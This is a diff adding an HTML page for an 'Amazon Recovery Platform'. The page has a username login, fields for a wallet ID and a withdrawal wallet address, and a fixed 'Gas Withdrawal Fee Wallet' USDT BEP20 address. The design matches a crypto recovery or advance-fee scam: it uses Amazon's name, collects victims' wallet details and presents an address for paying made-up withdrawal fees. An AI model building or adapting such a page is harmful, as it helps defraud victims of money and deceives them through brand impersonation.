@@ -1,1 +1,238 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
 
+  <!-- Supports Arabic and other international usernames -->
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <meta
+    name="description"
+    content="Amazon Recovery Platform"
+  >
+
+  <title>Amazon Recovery Platform</title>
+
+  <link rel="stylesheet" href="Styles.css">
+</head>
+
+<body>
+
+  <!-- =========================
+       LOGIN SCREEN
+  ========================== -->
+  <main id="loginScreen" class="login-screen">
+
+    <div class="login-card">
+
+      <div class="brand-mark">
+        AR
+      </div>
+
+      <h1>Amazon Recovery Platform</h1>
+
+      <p class="login-subtitle">
+        Enter your username to continue
+      </p>
+
+      <form id="loginForm" autocomplete="off">
+
+        <label for="username">
+          Username
+        </label>
+
+        <input
+          type="text"
+          id="username"
+          name="username"
+          placeholder="Enter username"
+          autocomplete="off"
+          required
+        >
+
+        <button type="submit" class="primary-button">
+          Continue
+        </button>
+
+      </form>
+
+    </div>
+
+  </main>
+
+
+  <!-- =========================
+       DASHBOARD
+  ========================== -->
+  <main id="dashboardScreen" class="dashboard-screen hidden">
+
+    <!-- HEADER -->
+    <header class="top-header">
+
+      <div class="brand">
+        <div class="brand-mark small">
+          AR
+        </div>
+
+        <div>
+          <h1>Amazon Recovery Platform</h1>
+          <span>Recovery Dashboard</span>
+        </div>
+      </div>
+
+    </header>
+
+
+    <!-- DASHBOARD CONTENT -->
+    <section class="dashboard-container">
+
+      <!-- WELCOME -->
+      <div class="welcome-card">
+
+        <div>
+          <p class="section-label">
+            Welcome
+          </p>
+
+          <h2 id="displayUsername" dir="auto"></h2>
+        </div>
+
+      </div>
+
+
+      <!-- WALLET SECTIONS -->
+      <div class="wallet-grid">
+
+        <!-- CONNECT WALLET ID -->
+        <section class="wallet-card">
+
+          <div class="card-icon">
+            ◇
+          </div>
+
+          <div class="card-content">
+
+            <h3>
+              Connect Wallet ID
+            </h3>
+
+            <p>
+              Enter your wallet ID.
+            </p>
+
+            <div class="input-row">
+
+              <input
+                type="text"
+                id="walletId"
+                name="walletId"
+                placeholder="Enter wallet ID"
+                autocomplete="off"
+                spellcheck="false"
+              >
+
+              <button
+                type="button"
+                id="saveWalletButton"
+                class="save-button"
+              >
+                Save
+              </button>
+
+            </div>
+
+            <div
+              id="walletSavedMessage"
+              class="saved-message"
+              aria-live="polite"
+            ></div>
+
+          </div>
+
+        </section>
+
+
+        <!-- WITHDRAWAL WALLET -->
+        <section class="wallet-card">
+
+          <div class="card-icon">
+            ⇄
+          </div>
+
+          <div class="card-content">
+
+            <h3>
+              Withdrawal Wallet Address
+            </h3>
+
+            <p>
+              Enter the wallet address for withdrawals.
+            </p>
+
+            <input
+              type="text"
+              id="withdrawalWallet"
+              name="withdrawalWallet"
+              placeholder="Enter withdrawal wallet address"
+              autocomplete="off"
+              spellcheck="false"
+            >
+
+          </div>
+
+        </section>
+
+
+        <!-- GAS WITHDRAWAL FEE WALLET -->
+        <section class="wallet-card">
+
+          <div class="card-icon">
+            ₿
+          </div>
+
+          <div class="card-content">
+
+            <h3>
+              Gas Withdrawal Fee Wallet
+            </h3>
+
+            <p>
+              USDT — BEP20 Network
+            </p>
+
+            <div class="address-display">
+
+              <span
+                id="gasWalletAddress"
+                dir="ltr"
+              >
+                0xeF43F8F28dC19DAE233A19adfee8C109E4a1bfBf
+              </span>
+
+            </div>
+
+          </div>
+
+        </section>
+
+      </div>
+
+    </section>
+
+
+    <!-- FOOTER -->
+    <footer class="dashboard-footer">
+
+      <span>
+        Amazon Recovery Platform
+      </span>
+
+    </footer>
+
+  </main>
+
+
+  <script src="app.js"></script>
+
+</body>
+</html>
